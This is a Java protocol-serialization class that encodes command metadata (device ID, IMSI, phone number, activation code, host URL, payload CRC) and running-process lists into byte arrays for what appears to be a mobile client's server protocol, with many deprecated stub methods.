package com.vvt.phoenix.prot.parser;

import java.io.ByteArrayOutputStream;

import com.vvt.phoenix.prot.command.CommandMetaData;
import com.vvt.phoenix.prot.command.CommandMetaDataWrapper;
import com.vvt.phoenix.prot.command.FxProcess;
import com.vvt.phoenix.prot.command.GetActivationCode;
import com.vvt.phoenix.prot.command.GetCSID;
import com.vvt.phoenix.prot.command.GetCommunicationDirectives;
import com.vvt.phoenix.prot.command.GetConfiguration;
import com.vvt.phoenix.prot.command.GetProcessBlackList;
import com.vvt.phoenix.prot.command.GetProcessWhiteList;
import com.vvt.phoenix.prot.command.GetTime;
import com.vvt.phoenix.prot.command.SendActivate;
import com.vvt.phoenix.prot.command.SendClearCSID;
import com.vvt.phoenix.prot.command.SendDeactivate;
import com.vvt.phoenix.prot.command.SendHeartbeat;
import com.vvt.phoenix.prot.command.SendMessage;
import com.vvt.phoenix.prot.command.SendRunningProcess;
import com.vvt.phoenix.util.ByteUtil;
import com.vvt.phoenix.util.IOStreamUtil;

/**
 * @author Tanakharn
 * @version 1.0
 * @created 27-Apr-2010 10:36:18 AM
 * Refactoring: January 2012
 */
public class ProtocolParser {
	
	public static byte[] parseCommandMetadata(CommandMetaDataWrapper metaWrapper){
		
		CommandMetaData metaData = metaWrapper.getCommandMetaData();
		ByteArrayOutputStream byteStream = new ByteArrayOutputStream();

		//1 parse protocol version : short 2 bytes
		byteStream.write(ByteUtil.toBytes((short) metaData.getProtocolVersion()), 0, 2);
		
		//2 parse productID : short 2 bytes
		byteStream.write(ByteUtil.toBytes((short) metaData.getProductId()), 0, 2);
		
		//3 parse product version (variable) and its length (1 byte)
		String productVersion = metaData.getProductVersion();
		if(productVersion != null){
			byte[] bytesStr = ByteUtil.toBytes(productVersion);
			int bytesLen = bytesStr.length; 
			byteStream.write((byte) bytesLen);
			byteStream.write(bytesStr, 0, bytesLen);
		}else{
			byteStream.write((byte) 0);
		}
		
		//4 parse cfg_id : short 2 bytes
		byteStream.write(ByteUtil.toBytes((short) metaData.getConfId()), 0, 2);
		
		//5 parse deviceID (variable) and its length (1 byte)
		String deviceId = metaData.getDeviceId();
		if(deviceId != null){
			byte[] bytesStr = ByteUtil.toBytes(deviceId);
			int bytesLen = bytesStr.length; 
			byteStream.write((byte) bytesLen);
			byteStream.write(bytesStr, 0, bytesLen);
		}else{
			byteStream.write((byte) 0);
		}
		
		//6 parse activation code (variable) and its length (1 byte)
		String activationCode = metaData.getActivationCode();
		if(activationCode != null){
			byte[] bytesStr = ByteUtil.toBytes(activationCode);
			int bytesLen = bytesStr.length; 
			byteStream.write((byte) bytesLen);
			byteStream.write(bytesStr, 0, bytesLen);
		}else{
			byteStream.write((byte) 0);
		}
		
		//7 parse language : byte 1 byte
		byteStream.write((byte) metaData.getLanguage());
		
		//8 parse phone number (variable) and its length (1 byte)
		String phoneNumber = metaData.getPhoneNumber();
		if(phoneNumber != null){
			byte[] bytesStr = ByteUtil.toBytes(phoneNumber);
			int bytesLen = bytesStr.length; 
			byteStream.write((byte) bytesLen);
			byteStream.write(bytesStr, 0, bytesLen);
		}else{
			byteStream.write((byte) 0);
		}
		
		//9 parse MCC (variable) and its length (1 byte)
		String mcc = metaData.getMcc();
		if(mcc != null){
			byte[] bytesStr = ByteUtil.toBytes(mcc);
			int bytesLen = bytesStr.length; 
			byteStream.write((byte) bytesLen);
			byteStream.write(bytesStr, 0, bytesLen);
		}else{
			byteStream.write((byte) 0);
		}
		
		//10 parse MNC (variable) and its length (1 byte)
		String mnc = metaData.getMnc();
		if(mnc != null){
			byte[] bytesStr = ByteUtil.toBytes(mnc);
			int bytesLen = bytesStr.length; 
			byteStream.write((byte) bytesLen);
			byteStream.write(bytesStr, 0, bytesLen);
		}else{
			byteStream.write((byte) 0);
		}
		
		//11 parse IMSI and its length (1 byte)
		String imsi = metaData.getImsi();
		if(imsi != null){
			byte[] bytesStr = ByteUtil.toBytes(imsi);
			int bytesLen = bytesStr.length; 
			byteStream.write((byte) bytesLen);
			byteStream.write(bytesStr, 0, bytesLen);
		}else{
			byteStream.write((byte) 0);
		}
		
		//12 parse Host URL and its length (1 byte)
		String url = metaData.getHostUrl();
		if(url != null){
			byte[] bytesStr = ByteUtil.toBytes(url);
			int bytesLen = bytesStr.length; 
			byteStream.write((byte) bytesLen);
			byteStream.write(bytesStr, 0, bytesLen);
		}else{
			byteStream.write((byte) 0);
		}
		
		//13 parse Transport Directive : 1 byte
		byteStream.write((byte) metaWrapper.getTransportDirective());
		
		//14 parse Encryption Code : 1 byte
		byteStream.write((byte)	metaData.getEncryptionCode());
		
		//15 parse Compression Code : 1 byte
		byteStream.write((byte)	metaData.getCompressionCode());
		
		//16 parse Payload Size : integer 4 bytes
		byteStream.write(ByteUtil.toBytes((int) metaWrapper.getPayloadSize()), 0, 4);
		
		//17 parse Payload CRC32 : integer 4 bytes
		byteStream.write(ByteUtil.toBytes((int) metaWrapper.getPayloadCrc32()), 0, 4);
		
		byte[] result = byteStream.toByteArray();
		IOStreamUtil.safelyCloseStream(byteStream);
		
		return result;
	}
		
	
	// ********************************************* Command Send ************************************* //
	
	//private static ProtocolData parseActivateRequest(ActivateRequest request){	
	
	public static byte[] parseSendActivate(SendActivate request){
		
		ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
		
		//1 device info and its 1 byte length
		String deviceInfo = request.getDeviceInfo();
		if(deviceInfo != null){
			byte[] bytesStr = ByteUtil.toBytes(deviceInfo);
			int bytesLen = bytesStr.length; 
			byteStream.write((byte) bytesLen);
			byteStream.write(bytesStr, 0, bytesLen);
		}else{
			byteStream.write((byte) 0);
		}
		
		//2 device model
		String deviceModel = request.getDeviceModel();
		if(deviceModel != null){
			byte[] bytesStr = ByteUtil.toBytes(deviceModel);
			int bytesLen = bytesStr.length; 
			byteStream.write((byte) bytesLen);
			byteStream.write(bytesStr, 0, bytesLen);
		}else{
			byteStream.write((byte) 0);
		}
	
		byte[] result = byteStream.toByteArray();
		IOStreamUtil.safelyCloseStream(byteStream);
		
		return result;
	}

	//private static ProtocolData parseDeactivateRequest(DeactivateRequest req){
	/**
	 * @param request
	 * @return
	 * @deprecated SendDeactivate does not have CommandData in Payload
	 */
	public static byte[] parseSendDeactivate(SendDeactivate request){

		/*DataBuffer buffer = new DataBuffer();
		
		//1 parse Command
		//buffer.writeShort((short) request.getCmd());

		return buffer.toArray();*/
		return new byte[0];
	}
	
	/**
	 * @param request
	 * @return
	 * @deprecated Currently this command has been decided that will not be use for a mobile client but this could change in the future.
	 */
	public static byte[] parseSendClearCSID(SendClearCSID request){

		/*DataBuffer buffer = new DataBuffer();
		
		//1 parse session ID
		//buffer.writeInt(request.getSessionId());
		buffer.writeByte((byte) request.getSessionId());
		

		return buffer.toArray();*/
		return new byte[0];
	}
	
	
	/**
	 * @param request
	 * @return
	 * @deprecated SendHeartBeat does not have CommandData in Payload
	 */
	public static byte[] parseSendHeartBeat(SendHeartbeat request){
		/*DataBuffer buffer = new DataBuffer();
		
		// parse Command
		//buffer.writeShort((short) request.getCmd());

		return buffer.toArray();*/
		return new byte[0];
	}

	/**
	 * @param request
	 * @return
	 * @deprecated this command is obsolete
	 */
	public static byte[] parseSendMessage(SendMessage request){
		/*DataBuffer buffer = new DataBuffer();
		
		//1 parse category
		buffer.writeByte((byte) request.getCategory());
		
		//2 parse priority
		buffer.writeByte((byte) request.getPriority());
		
		//3 parse message
		String message = request.getMessage();
		if(message != null){
			buffer.writeUTFWithLength(message, DataBuffer.SHORT);
		}else{
			buffer.writeShort((short) 0);
		}
		
		return buffer.toArray();*/
		return new byte[0];
	}
	
	public static byte[] parseSendRunningProcess(SendRunningProcess request){
		
		ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
		
		//1 parse process count 2 bytes
		byteStream.write(ByteUtil.toBytes((short) request.getProcessCount()), 0, 2);
		
		//2 parse process list
		for(int i=0; i<request.getProcessCount(); i++){
			FxProcess p = request.getProcess(i);
			//category 1 byte
			byteStream.write((byte) p.getCategory());
			
			//ID and 1 byte length
			String id = p.getName();
			if(id != null){
				byte[] bytesStr = ByteUtil.toBytes(id);
				int bytesLen = bytesStr.length; 
				byteStream.write((byte) bytesLen);
				byteStream.write(bytesStr, 0, bytesLen);
			}else{
				byteStream.write((byte) 0);
			}
		}
		
		byte[] result = byteStream.toByteArray();
		IOStreamUtil.safelyCloseStream(byteStream);
		
		return result;
	}
	
	// ********************************************* Command Get ************************************* //
	
	/**
	 * @param request
	 * @return
	 * @deprecated	GetCSID does not have CommandData in Payload
	 */
	public static byte[] parseGetCSID(GetCSID request){
		/*DataBuffer buffer = new DataBuffer();

		//parse Command
		buffer.writeShort((short) request.getCmd());

		return buffer.toArray();*/
		return new byte[0];
	}
	
	/**
	 * @param request
	 * @return
	 * @deprecated GetTime does not have CommandData in Payload
	 */
	public static byte[] parseGetTime(GetTime request){
		/*DataBuffer buffer = new DataBuffer();
		
		//parse Command
		buffer.writeShort((short) request.getCmd());
		
		return buffer.toArray();*/
		return new byte[0];
	}
	
	/**
	 * @param request
	 * @return
	 * @deprecated parseGetProcessWhiteList does not have CommandData in Payload
	 */
	public static byte[] parseGetProcessWhiteList(GetProcessWhiteList request){
		/*DataBuffer buffer = new DataBuffer();
		
		//parse Command
		buffer.writeShort((short) request.getCmd());
		
		return buffer.toArray();*/
		return new byte[0];
	}
	
	/**
	 * @param request
	 * @return
	 * @deprecated parseGetProcessBlackList does not have CommandData in Payload
	 */
	public static byte[] parseGetProcessBlackList(GetProcessBlackList request){
		/*DataBuffer buffer = new DataBuffer();
		
		//parse Command
		buffer.writeShort((short) request.getCmd());
		
		return buffer.toArray();*/
		return new byte[0];
	}
	
	/**
	 * @param request
	 * @return
	 * @deprecated parseGetCommunicationManagerSettings does not have CommandData in Payload
	 */
	public static byte[] parseGetCommunicationManagerSettings(GetCommunicationDirectives request){
		/*DataBuffer buffer = new DataBuffer();
		
		//parse Command
		buffer.writeShort((short) request.getCmd());
		
		return buffer.toArray();*/
		return new byte[0];
	}
	
	/**
	 * @param request
	 * @return
	 * @deprecated GetConfiguration does not have CommandData in Payload
	 */
	public static byte[] parseGetConfiguration(GetConfiguration request){
		/*DataBuffer buffer = new DataBuffer();
		
		//parse Command
		buffer.writeShort((short) request.getCmd());

		return buffer.toArray();*/
		return new byte[0];
	}
	
	/**
	 * @param request
	 * @return
	 * @deprecated GetActivationCode does not have CommandData in Payload
	 */
	public static byte[] parseGetActivationCode(GetActivationCode request){
		/*DataBuffer buffer = new DataBuffer();
		
		//parse Command
		buffer.writeShort((short) request.getCmd());

		return buffer.toArray();*/
		return new byte[0];
	}
}
